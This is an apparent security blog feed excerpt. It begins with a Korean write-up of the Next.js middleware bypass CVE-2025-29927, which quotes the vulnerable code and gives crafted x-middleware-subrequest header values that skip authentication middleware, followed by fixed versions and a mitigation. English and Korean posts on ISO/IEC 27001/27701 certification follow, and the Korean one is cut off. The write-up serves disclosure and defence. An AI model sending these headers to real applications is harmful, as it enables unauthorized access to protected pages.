&#xAC00;&#xB2A5;&#xC131;&#xC774; &#xB192;&#xC73C;&#xBBC0;&#xB85C;, &#xC544;&#xB798;&#xC640; &#xAC19;&#xC740; &#xD5E4;&#xB354;&#xB97C; &#xC694;&#xCCAD;&#xC5D0; &#xD3EC;&#xD568;&#xC2DC;&#xD0A4;&#xB294; &#xAC83; &#xB9CC;&#xC73C;&#xB85C;&#xB3C4; &#xD574;&#xB2F9; &#xBBF8;&#xB4E4;&#xC6E8;&#xC5B4;&#xB97C; &#xC6B0;&#xD68C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs plaintext">x-middleware-subrequest: pages/_middleware</code></pre><p>&#xC774; &#xB3D9;&#xC791;&#xC740; &#xB0B4;&#xBD80;&#xC801;&#xC73C;&#xB85C; <a href="https://github.com/vercel/next.js/blob/v12.0.7/packages/next/server/next-server.ts#L686">&#xB2E4;&#xC74C; &#xCF54;&#xB4DC;</a>&#xC5D0; &#xB530;&#xB77C; &#xCC98;&#xB9AC;&#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs ts"><span class="hljs-keyword">const</span> subreq = params.request.headers[<span class="hljs-string">`x-middleware-subrequest`</span>]<span class="hljs-keyword">const</span> subrequests = <span class="hljs-keyword">typeof</span> subreq === <span class="hljs-string">&apos;string&apos;</span> ? subreq.split(<span class="hljs-string">&apos;:&apos;</span>) : [] <span class="hljs-comment">//[1]</span><span class="hljs-keyword">const</span> allHeaders = <span class="hljs-keyword">new</span> Headers()<span class="hljs-keyword">let</span> result: FetchEventResult | <span class="hljs-literal">null</span> = <span class="hljs-literal">null</span><span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> middleware <span class="hljs-keyword">of</span> <span class="hljs-built_in">this</span>.middleware || []) {<span class="hljs-keyword">if</span> (middleware.match(params.parsedUrl.pathname)) {<span class="hljs-keyword">if</span> (!(<span class="hljs-keyword">await</span> <span class="hljs-built_in">this</span>.hasMiddleware(middleware.page, middleware.ssr))) {<span class="hljs-built_in">console</span>.warn(<span class="hljs-string">`The Edge Function for <span class="hljs-subst">${middleware.page}</span> was not found`</span>)<span class="hljs-keyword">continue</span>}<span class="hljs-keyword">await</span> <span class="hljs-built_in">this</span>.ensureMiddleware(middleware.page, middleware.ssr)<span class="hljs-keyword">const</span> middlewareInfo = getMiddlewareInfo({dev: <span class="hljs-built_in">this</span>.renderOpts.dev,distDir: <span class="hljs-built_in">this</span>.distDir,page: middleware.page,serverless: <span class="hljs-built_in">this</span>._isLikeServerless,})<span class="hljs-keyword">if</span> (subrequests.includes(middlewareInfo.name)) { <span class="hljs-comment">// [2]</span>result = {response: NextResponse.next(),waitUntil: <span class="hljs-built_in">Promise</span>.resolve(),}<span class="hljs-keyword">continue</span>}}</code></pre><p>&#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xC5D0;&#xC11C; &#xBCF4;&#xB0B8; <code>x-middleware-subrequest</code> &#xD5E4;&#xB354;&#xB97C; &#xC77D;&#xC5B4;, <code>:</code>&#xB97C; &#xAE30;&#xC900;&#xC73C;&#xB85C; &#xBD84;&#xB9AC;&#xB41C; &#xAC12;&#xB4E4;&#xC744; &#xC774;&#xBBF8; &#xC2E4;&#xD589;&#xB41C; &#xBBF8;&#xB4E4;&#xC6E8;&#xC5B4; &#xBAA9;&#xB85D;&#xC73C;&#xB85C; &#xAC04;&#xC8FC;&#xD569;&#xB2C8;&#xB2E4; [1]. &#xADF8;&#xB9AC;&#xACE0; &#xD604;&#xC7AC; &#xC2E4;&#xD589;&#xB420; &#xBBF8;&#xB4E4;&#xC6E8;&#xC5B4;&#xC758; &#xACBD;&#xB85C; &#xC815;&#xBCF4;(middlewareInfo.name)&#xAC00; &#xC774; &#xBBF8;&#xB4E4;&#xC6E8;&#xC5B4; &#xBAA9;&#xB85D;&#xC5D0; &#xD3EC;&#xD568;&#xB418;&#xC5B4; &#xC788;&#xB2E4;&#xBA74;, &#xD574;&#xB2F9; &#xBBF8;&#xB4E4;&#xC6E8;&#xC5B4;&#xB294; &#xC2E4;&#xD589;&#xB418;&#xC9C0; &#xC54A;&#xACE0; &#xB2E4;&#xC74C; &#xB2E8;&#xACC4;&#xB85C; &#xB118;&#xC5B4;&#xAC11;&#xB2C8;&#xB2E4;.[2]</p><p>Next.js 13 &#xBC84;&#xC804;&#xBD80;&#xD130;&#xB294; &#xC7AC;&#xADC0; &#xAC80;&#xC0AC;&#xAC00; &#xAD6C;&#xD604;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xCDE8;&#xC57D;&#xD55C; &#xCD5C;&#xC2E0; &#xBC84;&#xC804;(v15.2.2)&#xC758; <a href="https://github.com/vercel/next.js/blob/v15.1.7/packages/next/src/server/web/sandbox/sandbox.ts#L94">&#xCF54;&#xB4DC;</a>&#xB294; &#xB2E4;&#xC74C; &#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs ts"><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> run = withTaggedErrors(<span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">runWithTaggedErrors</span>(<span class="hljs-params">params</span>) </span>{  <span class="hljs-keyword">const</span> runtime = <span class="hljs-keyword">await</span> getRuntimeContext(params)  <span class="hljs-keyword">const</span> subreq = params.request.headers[<span class="hljs-string">`x-middleware-subrequest`</span>]  <span class="hljs-keyword">const</span> subrequests = <span class="hljs-keyword">typeof</span> subreq === <span class="hljs-string">&apos;string&apos;</span> ? subreq.split(<span class="hljs-string">&apos;:&apos;</span>) : []  <span class="hljs-keyword">const</span> MAX_RECURSION_DEPTH = <span class="hljs-number">5</span> <span class="hljs-comment">// [1]</span>  <span class="hljs-keyword">const</span> depth = subrequests.reduce(    (acc, curr) =&gt; (curr === params.name ? acc + <span class="hljs-number">1</span> : acc),    <span class="hljs-number">0</span>  )  <span class="hljs-keyword">if</span> (depth &gt;= MAX_RECURSION_DEPTH) { <span class="hljs-comment">//[2]</span>    <span class="hljs-keyword">return</span> {      waitUntil: <span class="hljs-built_in">Promise</span>.resolve(),      response: <span class="hljs-keyword">new</span> runtime.context.Response(<span class="hljs-literal">null</span>, {        headers: {          <span class="hljs-string">&apos;x-middleware-next&apos;</span>: <span class="hljs-string">&apos;1&apos;</span>,        },      }),    }</code></pre><p>&#xD5E4;&#xB354; <code>x-middleware-subrequest</code>&#xB294; &#xC774;&#xC804;&#xACFC; &#xB9C8;&#xCC2C;&#xAC00;&#xC9C0;&#xB85C; <code>:</code> &#xAE30;&#xD638;&#xB97C; &#xAE30;&#xC900;&#xC73C;&#xB85C; &#xBD84;&#xB9AC;&#xB418;&#xC5B4; &#xBC30;&#xC5F4;&#xB85C; &#xCC98;&#xB9AC;&#xB429;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; &#xC774;&#xBC88;&#xC5D0;&#xB294; &#xBBF8;&#xB4E4;&#xC6E8;&#xC5B4; &#xADDC;&#xCE59;&#xC744; &#xC6B0;&#xD68C;&#xD558;&#xACE0; &#xC694;&#xCCAD;&#xC744; &#xC9C1;&#xC811; &#xC804;&#xB2EC;&#xD558;&#xB294; &#xC870;&#xAC74;&#xC774; &#xB2EC;&#xB77C;&#xC84C;&#xC2B5;&#xB2C8;&#xB2E4;. <code>MAX_RECURSION_DEPTH</code>&#xB77C;&#xB294; &#xC0C1;&#xC218;(5)&#xB294;, &#xC7AC;&#xADC0;&#xC801;&#xC73C;&#xB85C; &#xBBF8;&#xB4E4;&#xC6E8;&#xC5B4;&#xAC00; &#xC2E4;&#xD589;&#xB418;&#xB294; &#xCD5C;&#xB300; &#xAE4A;&#xC774;&#xB97C; &#xC81C;&#xD55C;&#xD569;&#xB2C8;&#xB2E4;. &#xC694;&#xCCAD;&#xC5D0; &#xD3EC;&#xD568;&#xB41C; <code>x-middleware-subrequest</code> &#xD5E4;&#xB354;&#xC758; &#xAC01; &#xD56D;&#xBAA9; &#xC911;, &#xD604;&#xC7AC; &#xC2E4;&#xD589; &#xC911;&#xC778; &#xBBF8;&#xB4E4;&#xC6E8;&#xC5B4;&#xC758; &#xACBD;&#xB85C;(<code>params.name</code>)&#xC640; &#xC77C;&#xCE58;&#xD558;&#xB294; &#xAC12;&#xC774; &#xC788;&#xC744; &#xB54C;&#xB9C8;&#xB2E4; <code>depth</code> &#xAC12;&#xC774; 1&#xC529; &#xC99D;&#xAC00;&#xD569;&#xB2C8;&#xB2E4;.</p><p><code>depth &gt;= MAX_RECURSION_DEPTH</code> &#xC870;&#xAC74;&#xC744; &#xB9CC;&#xC871;&#xD558;&#xBA74;, &#xD574;&#xB2F9; &#xBBF8;&#xB4E4;&#xC6E8;&#xC5B4;&#xB294; &#xC2E4;&#xD589;&#xB418;&#xC9C0; &#xC54A;&#xACE0;, &#xC694;&#xCCAD;&#xC774; &#xBC14;&#xB85C; &#xB2E4;&#xC74C; &#xB2E8;&#xACC4;&#xB85C; &#xC804;&#xB2EC;&#xB429;&#xB2C8;&#xB2E4;. &#xC608;&#xB97C; &#xB4E4;&#xC5B4; <code>middleware.ts</code>&#xAC00; &#xBBF8;&#xB4E4;&#xC6E8;&#xC5B4; &#xACBD;&#xB85C;&#xB77C;&#xBA74;, &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xD5E4;&#xB354;&#xB97C; &#xC0BD;&#xC785;&#xD568;&#xC73C;&#xB85C;&#xC368; &#xC774;&#xB97C; &#xC6B0;&#xD68C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.<br><pre><code class="hljs plaintext">x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware</code></pre></p><p>&#xB9CC;&#xC57D; src/middleware.ts &#xACBD;&#xB85C;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xACBD;&#xC6B0;&#xB77C;&#xBA74; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; &#xC791;&#xC131;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.<br><pre><code class="hljs plaintext">x-middleware-subrequest: src/middleware:src/middleware:src/middleware:src/middleware:src/middleware</code></pre></p><p>&#xC608;&#xB97C; &#xB4E4;&#xC5B4;, Next.js&#xC5D0;&#xC11C; &#xC778;&#xC99D;&#xC774; &#xD544;&#xC694;&#xD55C; &#xD398;&#xC774;&#xC9C0;&#xC5D0; &#xC811;&#xADFC;&#xD558;&#xB824; &#xD560; &#xACBD;&#xC6B0;, &#xBBF8;&#xB4E4;&#xC6E8;&#xC5B4;&#xC5D0; &#xC758;&#xD574; &#xC694;&#xCCAD;&#xC740; /redirect &#xACBD;&#xB85C;&#xB85C; &#xB9AC;&#xB514;&#xB809;&#xC158;&#xB429;&#xB2C8;&#xB2E4;.<br><img src="/2025/03/27/bekim/2025-03-27/image.png" alt></p><p>&#xC544;&#xB798;&#xB294; <code>x-middleware-subrequest</code> &#xD5E4;&#xB354;&#xB97C; &#xC774;&#xC6A9;&#xD574; &#xC778;&#xC99D;&#xC774; &#xD544;&#xC694;&#xD55C; &#xACBD;&#xB85C;&#xB85C; &#xC811;&#xADFC;&#xD55C; &#xACB0;&#xACFC;&#xC785;&#xB2C8;&#xB2E4;. &#xD5E4;&#xB354; &#xC870;&#xC791;&#xC73C;&#xB85C; &#xC778;&#xD574; 200 &#xC751;&#xB2F5;&#xC774; &#xBC18;&#xD658;&#xB418;&#xBA70; &#xBBF8;&#xB4E4;&#xC6E8;&#xC5B4;&#xB97C; &#xC6B0;&#xD68C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.<br><img src="/2025/03/27/bekim/2025-03-27/image1.png" alt></p><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xC544;&#xB798; &#xBC84;&#xC804;&#xC5D0;&#xC11C; &#xC218;&#xC815;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;</p><ul><li>Next.js 15.x &#x2192; <strong>15.2.3</strong></li><li>Next.js 14.x &#x2192; <strong>14.2.25</strong></li><li>Next.js 13.x &#x2192; <strong>13.5.9</strong></li><li>Next.js 12.x &#x2192; <strong>12.3.5</strong></li></ul><p>&#xC548;&#xC804;&#xD55C; &#xBC84;&#xC804;&#xC73C;&#xB85C;&#xC758; &#xC5C5;&#xADF8;&#xB808;&#xC774;&#xB4DC;&#xAC00; &#xC5B4;&#xB824;&#xC6B4; &#xACBD;&#xC6B0;, <code>x-middleware-subrequest</code> &#xD5E4;&#xB354;&#xAC00; &#xD3EC;&#xD568;&#xB41C; &#xC678;&#xBD80; &#xC694;&#xCCAD;&#xC774; Next.js &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC5D0; &#xB3C4;&#xB2EC;&#xD558;&#xC9C0; &#xC54A;&#xB3C4;&#xB85D; &#xC6F9; &#xC11C;&#xBC84;&#xC5D0;&#xC11C; &#xD574;&#xB2F9; &#xD5E4;&#xB354;&#xB97C; &#xC81C;&#xAC70;&#xD558;&#xAC70;&#xB098; &#xD544;&#xD130;&#xB9C1;&#xD558;&#xB294; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC644;&#xD654;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://github.com/aydinnyunus/CVE-2025-29927">https://github.com/aydinnyunus/CVE-2025-29927</a></li><li><a href="https://zhero-web-sec.github.io/research-and-things/nextjs-and-the-corrupt-middleware">https://zhero-web-sec.github.io/research-and-things/nextjs-and-the-corrupt-middleware</a></li><li><a href="https://nextjs.org/docs/app/building-your-application/routing/middleware">https://nextjs.org/docs/app/building-your-application/routing/middleware</a></li><li><a href="https://nextjs.org/blog/cve-2025-29927">https://nextjs.org/blog/cve-2025-29927</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/bekim/">bekim</category>
      
      <category domain="https://hackyboiz.github.io/tags/CVE-2025-29927/">CVE-2025-29927</category>
      
      <category domain="https://hackyboiz.github.io/tags/Nextjs/">Nextjs</category>
      
      <category domain="https://hackyboiz.github.io/tags/middleware/">middleware</category>
      
      
      <comments>https://hackyboiz.github.io/2025/03/27/bekim/2025-03-27/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] Security Certification System(ISO/IEC) (en)</title>
      <link>https://hackyboiz.github.io/2025/03/27/romi0x/security_authentication_en/</link>
      <guid>https://hackyboiz.github.io/2025/03/27/romi0x/security_authentication_en/</guid>
      <pubDate>Thu, 27 Mar 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;Hello, this is romi0x. &amp;#x1F44B;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&amp;#x25B3;&amp;#x25B3; Corporation accelerates European expansion with ISO 27001 certifica</description>
        
      
      
      
      <content:encoded><![CDATA[<p>Hello, this is romi0x. &#x1F44B;</p><blockquote><p>&#x25B3;&#x25B3; Corporation accelerates European expansion with ISO 27001 certification</p><p>OO Cloud obtains APEC Privacy Certification &#x2018;CBPR&#x2019;</p><p>Korean startup secures GDPR compliance with ISO 27701 certification</p></blockquote><p>Have you come across headlines like these?</p><p>If your company is expanding globally or working with foreign partners, you&#x2019;ve probably heard of <strong>international security certifications</strong>.</p><p>As regulations like the <strong>GDPR (EU)</strong>, <strong>CCPA (US)</strong>, and personal data transfer laws in countries like <strong>Japan</strong> and <strong>Singapore</strong> continue to diversify, the importance of having a structured certification system to comply with these requirements is growing rapidly.</p><p>In this post, we&#x2019;ll take a closer look at two major international security certification systems:</p><p><strong>ISO/IEC 27001</strong> and <strong>ISO/IEC 27701</strong>.</p><p>Want to learn about Korea&#x2019;s domestic certification system instead?</p><p>Check out these blog posts:</p><p>&#x27A1;&#xFE0F; <a href="https://hackyboiz.github.io/2024/07/07/romi0x/certification_security/">https://hackyboiz.github.io/2024/07/07/romi0x/certification_security/</a></p><p>&#x27A1;&#xFE0F; <a href="https://hackyboiz.github.io/2024/07/21/romi0x/certification_privacy/">https://hackyboiz.github.io/2024/07/21/romi0x/certification_privacy/</a></p><hr><h2 id="What-is-ISO-IEC"><a href="#What-is-ISO-IEC" class="headerlink" title="What is ISO/IEC?"></a>What is ISO/IEC?</h2><p><img src="/2025/03/27/romi0x/security_authentication_en/image.png" alt="image"></p><p>Let&#x2019;s begin with a quick intro to ISO.</p><p>ISO certifications are issued based on <strong>standards developed by the International Organization for Standardization (ISO)</strong>.</p><p>They verify that a company&#x2019;s management system is built and operated in accordance with global best practices.</p><p>ISO has standards for many industries, and for <strong>information security</strong>, some of the most relevant ones include:</p><ol><li><strong>ISO/IEC 27001</strong> &#x2013; Information Security Management System (ISMS)</li><li><strong>ISO/IEC 27002</strong> &#x2013; Security controls implementation guidelines</li><li><strong>ISO/IEC 27017</strong> &#x2013; Guidelines for cloud security</li><li><strong>ISO/IEC 27018</strong> &#x2013; Privacy protection for cloud-based personal data</li><li><strong>ISO/IEC 27701</strong> &#x2013; Privacy Information Management System (PIMS)</li><li><strong>ISO/IEC 27005</strong> &#x2013; Information security risk management</li><li><strong>ISO/IEC 22301</strong> &#x2013; Business Continuity Management System (BCMS)</li></ol><p>Typically, companies begin with <strong>ISO/IEC 27001 (information security)</strong> as a foundation, and then extend to <strong>27701 (privacy)</strong>, <strong>27017/27018 (cloud-specific)</strong> as needed.</p><hr><h2 id="ISO-IEC-27001"><a href="#ISO-IEC-27001" class="headerlink" title="ISO/IEC 27001"></a>ISO/IEC 27001</h2><p><strong>ISO/IEC 27001</strong> is an international standard jointly established by ISO and the International Electrotechnical Commission (IEC).</p><p>It defines the requirements for an <strong>Information Security Management System (ISMS)</strong> that helps organizations protect their information assets and maintain <strong>confidentiality, integrity, and availability</strong> against evolving security threats.</p><p>This certification is globally recognized and applicable to all types of organizations&#x2014;corporates, public entities, cloud providers, etc.&#x2014;and helps them <strong>identify, assess, and manage</strong> security risks.</p><p>ISO 27001 is structured around the <strong>PDCA cycle</strong> (Plan-Do-Check-Act), requiring organizations to continuously plan, implement, review, and improve their security posture.</p><p><img src="/2025/03/27/romi0x/security_authentication_en/image2.png" alt="image"><br><a href="https://cdn.standards.iteh.ai/samples/79612/fc6152007e5648b2b175c1e9c2b4a553/ISO-28000-2022.pdf">https://cdn.standards.iteh.ai/samples/79612/fc6152007e5648b2b175c1e9c2b4a553/ISO-28000-2022.pdf</a></p><p>It covers several areas of information security, including:</p><p><img src="/2025/03/27/romi0x/security_authentication_en/image3.png" alt="image"><br>Audits are conducted by accredited international certification bodies.</p><p>Once certified, an organization undergoes <strong>annual surveillance audits</strong> and a <strong>recertification audit every three years</strong>. These ensure that the system is maintained and improved continuously.</p><hr><h2 id="ISO-IEC-27701"><a href="#ISO-IEC-27701" class="headerlink" title="ISO/IEC 27701"></a>ISO/IEC 27701</h2><p><strong>ISO/IEC 27701</strong> is an extension of ISO 27001 that adds comprehensive requirements for <strong>privacy protection</strong>. It provides a framework for managing <strong>Personally Identifiable Information (PII)</strong> throughout its entire lifecycle&#x2014;from collection to deletion. In short, <strong>ISO 27701 = ISO 27001 + privacy expansion</strong>.</p><p>The main goal of ISO/IEC 27701 is to help organizations meet global privacy regulations like <strong>GDPR, CCPA, APPI (Japan), PDPA (Singapore)</strong>, and to ensure the rights of data subjects are protected.</p><p>Key points:</p><ul><li>Cannot be certified alone &#x2014; <strong>must be built on ISO/IEC 27001</strong></li><li>Differentiates control sets for <strong>PII Controllers</strong> and <strong>PII Processors</strong></li><li>Includes guidelines for consent, third-party sharing, cross-border transfer, data subject rights, and more</li></ul><p><img src="/2025/03/27/romi0x/security_authentication_en/image4.png" alt="image"><br>By obtaining ISO/IEC 27701, your organization demonstrates <strong>accountability in privacy management</strong>, not just basic security controls.</p><hr><h2 id="What-about-Korea-ISMS-and-ISMS-P"><a href="#What-about-Korea-ISMS-and-ISMS-P" class="headerlink" title="What about Korea? ISMS and ISMS-P"></a>What about Korea? ISMS and ISMS-P</h2><p>South Korea also operates a national certification system for information security:</p><ul><li><strong>ISMS</strong> (Information Security Management System) focuses on information security only</li><li><strong>ISMS-P</strong> integrates <strong>privacy and information security</strong>, similar to ISO 27701 + 27001</li></ul><p>ISMS is mandatory for certain types of companies (e.g. cloud providers, major platforms), while ISMS-P is required for those handling large volumes of personal data or sensitive information.</p><p>Both certifications are administered by the <strong>Korea Internet &amp; Security Agency (KISA)</strong> and other regulatory bodies, and evaluate compliance with local laws like the Personal Information Protection Act (PIPA) and the Network Act.</p><hr><h2 id="&#x1F50D;-ISO-vs-ISMS-P-What&#x2019;s-the-difference"><a href="#&#x1F50D;-ISO-vs-ISMS-P-What&#x2019;s-the-difference" class="headerlink" title="&#x1F50D; ISO vs ISMS(P): What&#x2019;s the difference?"></a>&#x1F50D; ISO vs ISMS(P): What&#x2019;s the difference?</h2><p>While all these certifications help prove that your organization has a structured security system in place,</p><p>they differ in purpose, region, and legal applicability.</p><p><img src="/2025/03/27/romi0x/security_authentication_en/image5.png" alt="image"></p><hr><h2 id="So-which-one-should-you-choose"><a href="#So-which-one-should-you-choose" class="headerlink" title="So, which one should you choose?"></a>So, which one should you choose?</h2><ul><li><p>If you&#x2019;re <strong>expanding internationally</strong> or working with <strong>foreign partners</strong>,</p><p>&#x2192; Go with <strong>ISO/IEC 27001 + 27701</strong></p></li><li><p>If your focus is <strong>serving the Korean market</strong>,</p><p>&#x2192; Start with <strong>ISMS</strong>, and expand to <strong>ISMS-P</strong> if handling lots of personal data</p></li><li><p>Some organizations pursue <strong>both</strong>, but it&#x2019;s best to decide based on your audience, legal obligations, and business goals.</p></li></ul><hr><p>&#x1F517; Want to learn more about Korean security certifications?</p><p>&#x27A1;&#xFE0F; <a href="https://hackyboiz.github.io/2024/07/07/romi0x/certification_security/">https://hackyboiz.github.io/2024/07/07/romi0x/certification_security/</a></p><p>&#x27A1;&#xFE0F; <a href="https://hackyboiz.github.io/2024/07/21/romi0x/certification_privacy/">https://hackyboiz.github.io/2024/07/21/romi0x/certification_privacy/</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/romi0x/">romi0x</category>
      
      <category domain="https://hackyboiz.github.io/tags/certification/">certification</category>
      
      <category domain="https://hackyboiz.github.io/tags/privacy/">privacy</category>
      
      
      <comments>https://hackyboiz.github.io/2025/03/27/romi0x/security_authentication_en/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] 국외 보안 인증제도(ISO/IEC) (ko)</title>
      <link>https://hackyboiz.github.io/2025/03/27/romi0x/security_authentication_ko/</link>
      <guid>https://hackyboiz.github.io/2025/03/27/romi0x/security_authentication_ko/</guid>
      <pubDate>Thu, 27 Mar 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;&amp;#xC548;&amp;#xB155;&amp;#xD558;&amp;#xC138;&amp;#xC694;, romi0x&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;.&amp;#x1F44B;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;&amp;#x25B3;&amp;#x25B3;&amp;#xAE30;&amp;#</description>
        
      
      
      
      <content:encoded><![CDATA[<p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694;, romi0x&#xC785;&#xB2C8;&#xB2E4;.&#x1F44B;</p><blockquote><p><strong>&#x25B3;&#x25B3;&#xAE30;&#xC5C5;, ISO 27001 &#xC778;&#xC99D; &#xD68D;&#xB4DD;&#xC73C;&#xB85C; &#xC720;&#xB7FD; &#xC9C4;&#xCD9C; &#xAC00;&#xC18D;&#xD654;</strong></p><p><strong>OO&#xD074;&#xB77C;&#xC6B0;&#xB4DC;, APEC &#xAC1C;&#xC778;&#xC815;&#xBCF4; &#xC778;&#xC99D; &#x2018;CBPR&#x2019; &#xCDE8;&#xB4DD;</strong></p><p><strong>&#xAD6D;&#xB0B4; &#xC2A4;&#xD0C0;&#xD2B8;&#xC5C5;, ISO 27701 &#xC778;&#xC99D;&#xC73C;&#xB85C; GDPR &#xB300;&#xC751; &#xAE30;&#xBC18; &#xB9C8;&#xB828;</strong></p></blockquote><p>&#xC774;&#xB7F0; &#xB274;&#xC2A4; &#xD5E4;&#xB4DC;&#xB77C;&#xC778;, &#xD55C; &#xBC88;&#xCBE4; &#xBCF4;&#xC2E0; &#xC801; &#xC788;&#xC9C0; &#xC54A;&#xB098;&#xC694;?</p><p>&#xAE00;&#xB85C;&#xBC8C; &#xC2DC;&#xC7A5;&#xC5D0; &#xC9C4;&#xCD9C;&#xD558;&#xAC70;&#xB098; &#xC678;&#xAD6D;&#xACC4; &#xAE30;&#xC5C5;&#xACFC; &#xD611;&#xB825;&#xD558;&#xB824;&#xB294; &#xAE30;&#xC5C5;&#xC774;&#xB77C;&#xBA74;, &#xAD6D;&#xC81C; &#xBCF4;&#xC548; &#xC778;&#xC99D;&#xC5D0; &#xB300;&#xD574; &#xD55C; &#xBC88;&#xCBE4; &#xB4E4;&#xC5B4;&#xBCF4;&#xC168;&#xC744; &#xAC81;&#xB2C8;&#xB2E4;. &#xD2B9;&#xD788; &#xC720;&#xB7FD;&#xC758; GDPR, &#xBBF8;&#xAD6D;&#xC758; CCPA, &#xC77C;&#xBCF8;&#xB7;&#xC2F1;&#xAC00;&#xD3EC;&#xB974;&#xC758; &#xAC1C;&#xC778;&#xC815;&#xBCF4; &#xC774;&#xC804; &#xC694;&#xAC74; &#xB4F1; &#xAD6D;&#xAC00;&#xBCC4; &#xADDC;&#xC81C;&#xAC00; &#xB2E4;&#xC591;&#xD654;&#xB418;&#xBA74;&#xC11C;, &#xC774;&#xB97C; &#xCCB4;&#xACC4;&#xC801;&#xC73C;&#xB85C; &#xB300;&#xC751;&#xD560; &#xC218; &#xC788;&#xB294; &#xC778;&#xC99D; &#xC81C;&#xB3C4;&#xC758; &#xC911;&#xC694;&#xC131;&#xC774; &#xCEE4;&#xC9C0;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC774; &#xAE00;&#xC5D0;&#xC11C;&#xB294; &#xAD6D;&#xC81C;&#xC801;&#xC778; &#xBCF4;&#xC548; &#xC778;&#xC99D; &#xC81C;&#xB3C4;&#xC778; <strong>ISO/IEC 27001, ISO/IEC 27701</strong>&#xC5D0; &#xB300;&#xD574; &#xC0B4;&#xD3B4;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xCD94;&#xAC00;&#xB85C;! &#xAD6D;&#xB0B4; &#xBCF4;&#xC548; &#xC778;&#xC99D;&#xC81C;&#xB3C4;&#xAC00; &#xAD81;&#xAE08;&#xD558;&#xB2E4;&#xBA74;, &#xC544;&#xB798; &#xBE14;&#xB85C;&#xADF8;&#xC5D0;&#xC11C; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xC138;&#xC694;~</p><p>&#x27A1;&#xFE0F; <a href="https://hackyboiz.github.io/2024/07/07/romi0x/certification_security/">Part1. &#xAD6D;&#xB0B4; &#xBCF4;&#xC548; &#xC778;&#xC99D;&#xC81C;&#xB3C4;- &#xC815;&#xBCF4;&#xBCF4;&#xD638;</a></p><p>&#x27A1;&#xFE0F; <a href="https://hackyboiz.github.io/2024/07/21/romi0x/certification_privacy/">Part2. &#xAD6D;&#xB0B4; &#xBCF4;&#xC548; &#xC778;&#xC99D;&#xC81C;&#xB3C4;- &#xAC1C;&#xC778;&#xC815;&#xBCF4;&#xBCF4;&#xD638; &amp; &#xD074;&#xB77C;&#xC6B0;&#xB4DC;</a></p><hr><h2 id="ISO-IEC"><a href="#ISO-IEC" class="headerlink" title="ISO/IEC?"></a>ISO/IEC?</h2><p><img src="/2025/03/27/romi0x/security_authentication_ko/image.png" alt="&#xC0AC;&#xC9C4;"></p><p>&#xBA3C;&#xC800;, ISO&#xC5D0; &#xB300;&#xD574; &#xC18C;&#xAC1C;&#xD574;&#xBCFC;&#xAC8C;&#xC694;.</p><p>ISO &#xC778;&#xC99D;&#xC740; <strong>&#xAD6D;&#xC81C;&#xD45C;&#xC900;&#xD654;&#xAE30;&#xAD6C;(ISO)&#xAC00; &#xAC1C;&#xBC1C;&#xD55C; &#xD45C;&#xC900;&#xC5D0; &#xB530;&#xB978; &#xC778;&#xC99D;</strong>&#xC73C;&#xB85C;, &#xAE30;&#xC5C5;&#xC758; &#xACBD;&#xC601;&#xC2DC;&#xC2A4;&#xD15C;&#xC774; &#xAD6D;&#xC81C; &#xD45C;&#xC900;&#xC5D0; &#xC801;&#xD569;&#xD558;&#xAC8C; &#xAD6C;&#xCD95;&#xB418;&#xC5B4; &#xC788;&#xC74C;&#xC744; &#xC99D;&#xBA85;&#xD558;&#xB294; &#xC81C;&#xB3C4;&#xC785;&#xB2C8;&#xB2E4;.</p><p>ISO&#xB294; &#xB2E4;&#xC591;&#xD55C; &#xBD84;&#xC57C;&#xC5D0; &#xC778;&#xC99D;&#xC744; &#xBD80;&#xC5EC;&#xD558;&#xACE0; &#xC788;&#xB294;&#xB370;&#xC694;, &#xADF8; &#xC911;&#xC5D0; &#xC815;&#xBCF4;&#xBCF4;&#xC548;&#xACFC; &#xAD00;&#xB828;&#xB41C; &#xC778;&#xC99D;&#xC740; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC740; &#xC778;&#xC99D;&#xB4E4;&#xC774; 